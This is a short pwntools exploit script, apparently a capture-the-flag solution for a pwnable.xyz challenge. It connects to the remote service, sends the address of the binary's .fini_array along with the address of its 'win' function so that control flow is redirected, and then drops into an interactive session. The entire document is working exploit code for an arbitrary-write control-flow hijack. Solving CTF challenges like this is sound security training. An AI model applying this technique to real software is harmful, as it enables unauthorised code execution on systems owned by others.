from pwn import *

context.log_level = 'debug'
e = ELF('./challenge')
# p = process('./challenge')
p = remote('svc.pwnable.xyz',30033)
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)

sa(':',str(0x0000000000600bc0)) # .fini_array
sa(':',str(e.symbols['win']))

p.interactive()